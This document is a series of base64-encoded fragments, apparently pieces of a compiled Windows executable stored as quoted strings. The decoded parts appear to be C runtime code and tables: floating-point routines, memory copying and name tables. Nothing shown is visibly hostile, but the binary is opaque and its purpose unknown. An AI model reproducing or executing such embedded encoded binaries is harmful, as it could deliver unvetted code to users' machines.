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','AAADEj','CAAIAAgAAgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAABAQEBAQEBAQEBAQEBAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAAgECAQIBAgECAQIBAgECAQEBAAAAAICBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYEFCQ0RFRkdIS','RAAAAAAAAAAAAEAAAD8WQEQBFoBEAAAAACMggEQAAAAAAAAAAD/////AAAAAEAAAADsWQEQAAAAAAAAAAAAAAAAEIIBEIhYARAAAAAAAAAAAAAAAACkggEQSFoBEAAAAAAAAAAAAgAAAFhaARBkWgEQbFgBEAAAAACkggEQAQAAAAAAAAD/////AAAAAEAAAABIWgEQAAAAAAAAAAABAAAAQFsBEByDARAAAAAAAAAAAP////8AAAAAQAAAAIBaARAAAAAAAAAAAAMAAAC8WgEQSFsBEOBaARCQWgEQAAAAAAAAAAAAAAAAAAAAAECDARCUWwEQQIMBEAEAAAAAAAAA/////wAAAABAAAAAlFsBEMSCARACAAAAAAAAAP////8AAAAAQAAAAGRbARAAAAAAAAAAAAAAAAAcgwEQgFoBEAAAAAAAAAAAAAAAAMSCARBkWwEQkFoBEAAAAADwggEQAgAAAAAAAAD/////AAAAAEAAAACsWgEQAAAAAAAAAAADAAAApFsBEAAAAAAAAAAAAAAAAPCCARCsWgEQ4FoBEJBaARAAAAAAAAAAAAAAAAACAAAAiFsBEPxaARDgWgEQkFoBEAAAAAAAAAAAAAAAAAAAAABUNgAAhTYAAPBDAADAjgAA4LQAAAD5AAAb+QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiBZMZBAAAABRcARACAAAANFwBEAAAAAAAAAAAAAAAAAEAAAD/////AAAAAP////8AAAAAAQAAAAA','RQEQzEUBENxFARD4RQEQGEYBEEBGARBoRgEQkEYBELxGARDYRgEQ/EYBECBHARBMRwEQeEcBEJdXARCURwEQqEcBEMRHARDYRwEQ+EcBEF9fYmFzZWQoAAAAAF9fY2RlY2wAX19wYXNjYWwAAAAAX19zdGRjYWxsAAAAX190aGlzY2FsbAAAX19mYXN0Y2FsbAAAX192ZWN0b3JjYWxsAAAAAF9fY2xyY2FsbAAAAF9fZWFiaQAAX19wdHI2NABfX3Jlc3RyaWN0AABfX3VuYWxpZ25lZAByZXN0cmljdCgAAAAgbmV3AAAAACBkZWxldGUAPQAAAD4+AAA8PAAAIQAAAD09AAAhPQAAW10AAG9wZXJhdG9yAAAAAC0+AAAqAAAAKysAAC0tAAAtAAAAKwAAACYAAAAtPioALwAAACUAAAA8AAAAPD0AAD4AAAA+PQAALAAAACgpAAB+AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAABgdmJ0YWJsZScAAABgdmNhbGwnAGB0eXBlb2YnAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAYHZlY3RvciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAABgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAGBsb2NhbCB2ZnRhYmxlJwBgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAgbmV3W10AACBkZWxldGVbXQAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnACBUeXBlIERlc2NyaXB0b3InAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoACBCYXNlIENsYXNzIEFycmF5JwAAIENsYXNzIEhpZXJhcmNoeSBEZXNjcmlwdG9yJwAAAAAgQ29tcGxldGUgT2JqZWN0IExvY2F0b3InAAAAAAAAAAaAgIaAgYAAABADhoCGgoAUBQVFRUWFhYUFAAAwMIBQgIgACAAoJzhQV4AABwA3MDBQUIgAAAAgKICIgIAAAABgaGBoaGgICAd4cHB3cHAICAAACAAIAAcIAAAAU3VuAE1vbgBUdWUAV2VkAFRodQBGcmkAU2F0AFN1bmRheQAATW9uZGF5AABUdWVzZGF5AFdlZG5lc2RheQAAAFRodXJzZGF5AAAAAEZyaWRheQAAU2F0dXJkYXkAAAAASmFuAEZlYgBNYXIAQXByAE1heQBKdW4ASnVsAEF1ZwBTZXAAT2N0AE5vdgBEZWMASmFudWFyeQBGZWJydWFyeQAAAABNYXJjaAAAAEFwcmlsAAAASnVuZQAAAABKdWx5AAAAAEF1Z3VzdAAAU2VwdGVtYmVyAAAAT2N0b2JlcgBOb3ZlbWJlcgAAAABEZWNlbWJlcgAAAABBTQAAUE0AAE1NL2RkL3l5AAAAAGRkZGQsIE1NTU0gZGQsIHl5eXkASEg6bW06c3MAAAAAUwB1AG4AAABNAG8AbgAAAFQAdQBlAAAAVwBlAGQAAABUAGgAdQAAAEYAcgBpAAAAUwBhAHQAAABTAHUAbgBkAGEAeQAAAAAATQBvAG4AZABhAHkAAAAAAFQAdQBlAHMAZABhAHkAAABXAGUAZABuAGUAcwBkAGEAeQAAAFQAaAB1AHIAcwBkAGEAeQAAAAAARgByAGkAZABhAHkAAAAAAFMAYQB0AHUAcgBkAGEAeQAAAAAASgBhAG4AAABGAGUAYgAAAE0AYQByAAAAQQBwAHIAAABNAGEAeQAAAEoAdQBuAAAASgB1AGwAAABBAHUAZwAAAFMAZQBwAAAATwBjAHQAAABOAG8AdgAAAEQAZQBjAAAASgBhAG4AdQBhAHIAeQAAAEYAZQBiAHIAdQBhAHIAeQAAAAAATQBhAHIAYwBoAAAAQQBwAHIAaQBsAAAASgB1AG4AZQAAAAAASgB1AGwAeQAAAAAAQQB1AGcAdQBzAHQAAAAAAFMAZQBwAHQAZQBtAGIAZQByAAA','CDxBTDi2Xox0X8/v///zPA6CAVAADDVYvsg30MAXUN/3UQagD/dQjoR/3///91GP91FOicJwAAWVldw8zMzMzMV1aLdCQQi0wkFIt8JAyLwYvRA8Y7/nYIO/gPgmgDAAAPuiW8hgEQAXMH86TpFwMAAIH5gAAAAA+CzgEAAIvHM8apDwAAAHUOD7olEHABEAEPgtoEAAAPuiW8hgEQAA+DpwEAAPfHAwAAAA+FuAEAAPfGAwAAAA+FlwEAAA+65wJzDYsGg+kEjXYEiQeNfwQPuucDcxHzD34Og+kIjXYIZg/WD41/CPfGBwAAAHRjD7rmAw+DsgAAAGYPb070jXb0Zg9vXhCD6TBmD29GIGYPb24wjXYwg/kwZg9v02YPOg/ZDGYPfx9mD2/gZg86D8IMZg9/RxBmD2/NZg86D+wMZg9/byCNfzB9t412DOmvAAAAZg9vTviNdviNSQBmD29eEIPpMGYPb0YgZg9vbjCNdjCD+TBmD2/TZg86D9kIZg9/H2YPb+BmDzoPwghmD39HEGYPb81mDzoP7AhmD39vII','4BAACDxAzDVYvsgz3gDwEQAHQZaOAPARDow0IAAFmFwHQK/3UI/xXgDwEQWehJPgAAaFABARBoPAEBEOjNAAAAWVmFwHVDaPVkABDov+r//8cEJDgBARBoKAEBEOh2AAAAgz0oogEQAFlZdBtoKKIBEOhqQgAAWYXAdAxqAGoCagD/FSiiARAzwF3DVYvsagBqAf91COinAAAAg8QMXcNWagD/FUQAARCL8FboFQ8AAFboQRAAAFboGgUAAFboHEMAAFboEyUAAFboIUUAAIPEGF7pKiEAAFWL7ItFDFNWi3UIM9srxoPAA8HoAjl1DFcb//fXI/h2EIsGhcB0Av/Qg8YEQzvfcvBfXltdw1WL7FaLdQgzwOsPhcB1EIsOhcl0Av/Rg8YEO3UMcuxeXcNqCOjAPQAAWcNqC